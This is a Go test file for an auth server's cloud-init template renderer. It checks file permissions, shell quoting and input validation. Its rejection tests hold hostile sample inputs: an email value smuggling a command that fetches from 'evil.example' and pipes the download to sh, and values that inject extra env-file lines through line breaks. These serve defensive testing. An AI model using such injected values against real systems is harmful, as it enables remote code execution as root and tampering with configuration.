package authserver

import (
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

func validData() templateData {
	return templateData{
		Hostname:           "auth.example.test",
		ContactEmail:       "ops@example.test",
		ContainerImage:     DefaultContainerImage,
		GithubClientId:     "Iv1.0123456789abcdef",
		GithubClientSecret: "0123456789abcdef0123456789abcdef01234567",
		GithubOrg:          "holochain",
		GithubTeam:         "auth",
		SessionSecret:      strings.Repeat("s", minSessionSecretBytes),
		ApiTokens:          "token1,token2",
		RedisUrl:           "rediss://default:pw@private-db.example.test:25061",
		MaxPendingRequests: defaultMaxPendingRequests,
	}
}

func TestRenderCloudInitRendersBasicData(t *testing.T) {
	got, err := renderCloudInit(validData())
	if err != nil {
		t.Fatalf("renderCloudInit: %v", err)
	}

	for _, want := range []string{
		"#cloud-config\n",
		"Image=" + DefaultContainerImage + "\n",
		"GITHUB_ORG=holochain\n",
		"GITHUB_TEAM=auth\n",
		"HOST=0.0.0.0\n",
		"PORT=443\n",
		"PRODUCTION=true\n",
		"REDIRECT_URI=https://auth.example.test/ops/oauth-callback\n",
		"REDIS_URL=rediss://default:pw@private-db.example.test:25061\n",
		"TLS_CERT=/etc/letsencrypt/live/auth.example.test/fullchain.pem\n",
		"path: /opt/auth_srv/auth.env\n",
		"runcmd:\n",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("missing %q in rendered output:\n%s", want, got)
		}
	}
}

// The env file holds every secret this host has. Anything readable is bad, but
// world-readable is the one that turns a local account into full compromise.
func TestRenderedEnvFileIsNotWorldReadable(t *testing.T) {
	got, err := renderCloudInit(validData())
	if err != nil {
		t.Fatalf("renderCloudInit: %v", err)
	}

	idx := strings.Index(got, "path: /opt/auth_srv/auth.env")
	if idx < 0 {
		t.Fatalf("env file not found in rendered output")
	}
	if !strings.Contains(got[idx:], `permissions: "0600"`) {
		t.Errorf("env file is not mode 0600:\n%s", got[idx:min(idx+200, len(got))])
	}
}

// Values certbot receives are rendered into a shell command that runcmd executes
// as root, so they are quoted as well as validated.
func TestRenderCloudInitQuotesShellArguments(t *testing.T) {
	got, err := renderCloudInit(validData())
	if err != nil {
		t.Fatalf("renderCloudInit: %v", err)
	}

	for _, want := range []string{`-d "auth.example.test"`, `-m "ops@example.test"`} {
		if !strings.Contains(got, want) {
			t.Errorf("shell argument is not quoted; wanted %q in:\n%s", want, got)
		}
	}
}

func TestRenderedCloudInitIsValidYaml(t *testing.T) {
	d := validData()
	// A comma-separated token list and a URL with a password both carry
	// YAML-significant characters.
	d.ApiTokens = "a:1,b:2"
	got, err := renderCloudInit(d)
	if err != nil {
		t.Fatalf("renderCloudInit: %v", err)
	}

	var doc struct {
		WriteFiles []struct {
			Path        string `yaml:"path"`
			Content     string `yaml:"content"`
			Permissions string `yaml:"permissions"`
		} `yaml:"write_files"`
		Runcmd []string `yaml:"runcmd"`
	}
	if err := yaml.Unmarshal([]byte(got), &doc); err != nil {
		t.Fatalf("rendered cloud-init is not valid YAML: %v\n%s", err, got)
	}
	if len(doc.WriteFiles) != 3 {
		t.Errorf("expected 3 write_files entries, got %d", len(doc.WriteFiles))
	}
	if len(doc.Runcmd) != 1 {
		t.Errorf("expected 1 runcmd entry, got %d", len(doc.Runcmd))
	}
}

func TestRenderCloudInitRejectsBadInput(t *testing.T) {
	tests := []struct {
		name    string
		mutate  func(*templateData)
		wantMsg string
	}{
		{"empty hostname", func(d *templateData) { d.Hostname = "" }, "hostname is required"},
		{"hostname not fqdn", func(d *templateData) { d.Hostname = "auth" }, "fully qualified"},
		{"contact email injection", func(d *templateData) {
			d.ContactEmail = "`curl${IFS}evil.example|sh`@x.test"
		}, "not a valid email address"},
		{"empty github org", func(d *templateData) { d.GithubOrg = "" }, "githubOrg is required"},
		{"client secret with line break", func(d *templateData) {
			d.GithubClientSecret = "abc\nAPI_TOKENS=attacker"
		}, "must not contain line breaks"},
		// A line break here would truncate every setting after it in the env file.
		{"redis url with line break", func(d *templateData) {
			d.RedisUrl = "rediss://x\nTLS_CERT=/dev/null"
		}, "must not contain line breaks"},
		{"session secret too short", func(d *templateData) {
			d.SessionSecret = "tooshort"
		}, "at least 64 bytes"},
		{"max pending requests not positive", func(d *templateData) {
			d.MaxPendingRequests = 0
		}, "must be positive"},
		{"secret passed as key=value", func(d *templateData) {
			d.ApiTokens = "=token1,token2"
		}, "must not begin with '='"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			d := validData()
			tt.mutate(&d)

			if _, err := renderCloudInit(d); err == nil {
				t.Fatalf("expected an error, got none")
			} else if !strings.Contains(err.Error(), tt.wantMsg) {
				t.Errorf("error %q does not contain %q", err.Error(), tt.wantMsg)
			}
		})
	}
}
